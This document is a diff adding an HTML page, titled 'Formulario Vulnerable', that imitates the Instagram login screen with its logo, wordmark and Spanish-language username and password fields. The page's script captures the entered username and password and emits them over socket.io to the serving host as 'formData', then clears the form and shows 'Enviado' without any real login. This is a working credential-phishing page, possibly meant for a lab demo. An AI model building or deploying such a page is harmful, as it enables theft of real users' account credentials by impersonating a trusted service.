@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <title>Formulario Vulnerable</title>
+
+  <!-- Fuente similar a Instagram -->
+  <link href="https://fonts.googleapis.com/css2?family=Pacifico&display=swap" rel="stylesheet">
+
+  <style>
+    * { box-sizing: border-box; }
+
+    body {
+      background:#fafafa;
+      display:flex;
+      justify-content:center;
+      align-items:center;
+      min-height:100vh;
+      font-family: Arial, sans-serif;
+      margin:0;
+    }
+
+    .container {
+      width:100%;
+      max-width:360px;
+      background:#fff;
+      border:1px solid #dbdbdb;
+      padding:50px 32px;
+      border-radius:8px;
+      text-align:center;
+    }
+
+    .icon-wrapper {
+      margin-bottom:20px;
+    }
+
+    .icon-wrapper svg {
+      width:60px;
+      height:auto;
+    }
+
+    .logo {
+      font-family: 'Pacifico', cursive;
+      font-size:38px;
+      margin-bottom:25px;
+      margin-top:-8px;
+    }
+
+    input {
+      width:100%;
+      padding:12px;
+      margin:8px 0;
+      border:1px solid #dbdbdb;
+      border-radius:4px;
+      background:#fafafa;
+    }
+
+    button {
+      width:100%;
+      padding:12px;
+      margin-top:12px;
+      background:#0095f6;
+      color:#fff;
+      border:none;
+      border-radius:4px;
+      font-weight:bold;
+      cursor:pointer;
+    }
+
+    #messageSent, #messageError {
+      margin-top:13px;
+      display:none;
+    }
+
+    #messageSent  { color:green; }
+    #messageError { color:red; }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <!-- icono de instagram -->
+    <div class="icon-wrapper">
+      <svg viewBox="0 0 512 512">
+        <path d="M349.33 69.33H162.67A93.33 93.33 0 0069.33 162.67v186.66A93.33 93.33 0 00162.67 442.67h186.66A93.33 93.33 0 00442.67 349.33V162.67A93.33 93.33 0 00349.33 69.33zm61.34 280a61.34 61.34 0 01-61.34 61.34H162.67a61.34 61.34 0 01-61.34-61.34V162.67a61.34 61.34 0 0161.34-61.34h186.66a61.34 61.34 0 0161.34 61.34z"/>
+        <circle cx="256" cy="256" r="80"/>
+        <circle cx="347.5" cy="164.5" r="26.5"/>
+      </svg>
+    </div>
+
+    <div class="logo">Instagram</div>
+
+    <form id="loginForm">
+      <input type="text" id="username" placeholder="Teléfono, usuario o correo electrónico" />
+      <input type="password" id="password" placeholder="Contraseña" />
+      <button type="submit">Iniciar sesión</button>
+    </form>
+
+    <div id="messageSent">✅ Enviado</div>
+    <div id="messageError">⚠ Complete los campos</div>
+  </div>
+
+  <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+  <script>
+    const socket = io();
+
+    document.getElementById('loginForm').addEventListener('submit', (e) => {
+      e.preventDefault();
+
+      const username = document.getElementById('username').value.trim();
+      const password = document.getElementById('password').value.trim();
+      const msgSent  = document.getElementById('messageSent');
+      const msgError = document.getElementById('messageError');
+
+      if (!username || !password) {
+        msgError.style.display = 'block';
+        msgSent.style.display  = 'none';
+        return;
+      }
+
+      socket.emit('formData', { username, password });
+
+      document.getElementById('username').value = '';
+      document.getElementById('password').value = '';
+
+      msgError.style.display = 'none';
+      msgSent.style.display  = 'block';
+      setTimeout(() => (msgSent.style.display = 'none'), 2000);
+    });
+  </script>
+</body>
+</html>
